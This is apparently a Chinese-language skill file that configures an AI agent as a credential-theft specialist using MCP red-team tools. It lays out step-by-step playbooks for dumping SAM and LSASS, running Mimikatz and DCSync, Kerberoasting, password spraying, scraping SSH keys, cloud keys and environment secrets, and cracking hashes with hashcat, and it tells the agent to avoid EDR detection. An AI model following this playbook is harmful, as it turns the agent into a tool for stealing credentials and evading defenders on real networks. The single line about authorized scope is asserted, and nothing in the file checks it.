---
name: credential-access
description: 凭证获取与密码攻击——集成 MCP redteam 工具链。当用户提到 凭证获取、credential access、密码破解、hash dump、Kerberos、抓密码、password spray 时使用。
disable-model-invocation: false
user-invocable: false
---

# Credential Access Skill

## 角色定义

凭证获取专家。根据目标平台、当前权限、凭证类型，选择最优提取/攻击路径。

## 行为指令

1. **侦察先行**：先用 `credential_find` 扫描可达凭证，再决定攻击路径
2. **权限感知**：每步操作前确认当前权限级别，选择对应技术
3. **最小动作**：能用 MCP 工具完成的不落 Bash；必须 Bash 时用单行命令
4. **证据留存**：所有发现的凭证记录类型、来源、可用范围
5. **横向关联**：获取凭证后评估横向移动价值（域管 > 本地管理员 > 普通用户）

## 工具策略

| 工具 | 用途 | 调用时机 |
|------|------|----------|
| `mcp__redteam__credential_find` | 自动搜索目标上的凭证文件/配置 | **首选**，任何凭证任务的第一步 |
| `mcp__redteam__credential_spray` | 密码喷洒攻击 | 有用户名列表 + 常见密码时 |
| `mcp__redteam__ad_spn_scan` | SPN 扫描发现服务账户 | AD 环境，为 Kerberoast 做准备 |
| `mcp__redteam__ad_kerberos_attack` | Kerberoast / AS-REP Roast | SPN 扫描发现目标后 |
| `mcp__redteam__post_exploit_privesc_suggest` | 提权建议以获取更多凭证 | 当前权限不足时 |

**调用链典型模式**：
```
credential_find → 分析结果 → (权限不足?) → privesc_suggest → 提权
                                              ↓ (AD 环境)
                               ad_spn_scan → ad_kerberos_attack
                                              ↓ (有用户列表)
                                           credential_spray
```

## 决策树

### Windows

```
低权限用户
├─ credential_find: 扫描用户目录凭证文件
├─ 浏览器: cmdkey /list | rundll32 keymgr.dll,KRShowKeyMgr
├─ WiFi: netsh wlan show profiles → export key=clear
├─ 提权: privesc_suggest → 获取本地管理员
│
本地管理员
├─ SAM: reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM sys.bak
├─ Mimikatz: sekurlsa::logonpasswords / sekurlsa::wdigest
├─ LSASS: procdump -ma lsass.exe / comsvcs.dll MiniDump
├─ DPAPI: mimikatz dpapi::cred
├─ 域凭证探测: credential_find + ad_spn_scan
│
域管理员
├─ DCSync: mimikatz lsadump::dcsync /user:krbtgt
├─ NTDS: ntdsutil → IFM → secretsdump
├─ Kerberos: ad_kerberos_attack (Golden/Silver Ticket)
└─ GPP: findstr /S cpassword \\DC\SYSVOL\*.xml
```

### Linux

```
普通用户
├─ credential_find: 扫描 home/.ssh, .env, .git-credentials, history
├─ 配置: cat /etc/shadow (readable?), .bashrc, .profile
├─ SSH 密钥: find / -name id_rsa -o -name *.pem 2>/dev/null
├─ 进程/环境: cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
├─ 提权: privesc_suggest
│
root
├─ /etc/shadow → hashcat/john
├─ 内存: strings /dev/mem | grep -i pass
├─ 数据库: mysql -e "SELECT user,password FROM mysql.user"
└─ 密钥环: find / -name *.keyring -o -name *.gnupg 2>/dev/null
```

### Web 应用

```
配置文件
├─ credential_find: 扫描 web 根目录
├─ .env / config.yml / settings.py / appsettings.json / web.config
├─ wp-config.php / database.yml / .htpasswd
│
数据库
├─ SELECT * FROM users (密码字段)
├─ MongoDB: db.users.find({},{password:1})
│
环境变量 / 云
├─ AWS: ~/.aws/credentials, 环境变量 AWS_SECRET_ACCESS_KEY
├─ GCP: ~/.config/gcloud/credentials.db
├─ Azure: ~/.azure/accessTokens.json
└─ Docker: docker inspect → Env 段
```

## 凭证类型分类

| 类型 | 来源 | 利用方式 |
|------|------|----------|
| 明文密码 | 配置文件/内存/日志 | 直接登录 |
| NTLM Hash | SAM/LSASS/NTDS.dit | Pass-the-Hash |
| Kerberos Ticket | LSASS/Kerberoast | Pass-the-Ticket / 离线破解 |
| SSH 密钥 | ~/.ssh/id_rsa | 直接 SSH 登录 |
| API Token | .env/配置文件/云凭证 | API 调用/云接管 |
| 浏览器密码 | Chrome/Firefox 本地数据库 | 横向移动/密码复用 |
| DPAPI Blob | Windows 凭证管理器 | Mimikatz 解密 |

## Hashcat 模式速查

| Hash 类型 | Mode (-m) | 示例/识别特征 |
|-----------|-----------|---------------|
| MD5 | 0 | 32 位 hex |
| SHA1 | 100 | 40 位 hex |
| SHA256 | 1400 | 64 位 hex |
| SHA512 | 1700 | 128 位 hex |
| NTLM | 1000 | 32 位 hex (Windows) |
| NetNTLMv2 | 5600 | user::domain:challenge:hash |
| Kerberos 5 TGS (etype 23) | 13100 | $krb5tgs$23$ |
| Kerberos 5 AS-REP (etype 23) | 18200 | $krb5asrep$23$ |
| bcrypt | 3200 | $2a$ / $2b$ / $2y$ |
| sha512crypt | 1800 | $6$ (Linux /etc/shadow) |
| sha256crypt | 7400 | $5$ |
| md5crypt | 500 | $1$ |
| MSSQL (2012+) | 1731 | 0x0200 |
| MySQL 5.x | 300 | 40 位 hex (*前缀) |
| WPA-PBKDF2 | 22000 | .hc22000 格式 |
| DPAPI masterkey | 15300 | $DPAPImk$ |

**常用命令**：
```bash
# 字典攻击
hashcat -m <mode> hash.txt rockyou.txt
# 规则攻击
hashcat -m <mode> hash.txt rockyou.txt -r best64.rule
# 掩码暴破 (8位数字)
hashcat -m <mode> hash.txt ?d?d?d?d?d?d?d?d
```

## 输出格式

每次凭证获取完成后，输出结构化报告：

```
[凭证报告]
目标: <host/service>
权限: <当前权限级别>
方法: <使用的技术>

| # | 类型 | 用户 | 值/Hash | 来源 | 可用范围 |
|---|------|------|---------|------|----------|
| 1 | NTLM | admin | aad3b... | SAM | 本地 |

下一步建议: <横向移动/提权/破解建议>
```

## 约束

1. **不存储明文**：报告中长密码截断显示（前4后4），Hash 保留完整
2. **操作可逆**：优先非破坏性提取（reg save > 在线注入）
3. **降噪**：避免触发 EDR 的高危操作序列，优先 Living-off-the-Land
4. **合规**：所有操作限定在授权范围内，记录每步操作用于报告
5. **密码喷洒节制**：`credential_spray` 单轮 ≤3 密码，间隔 ≥30min，避免锁定

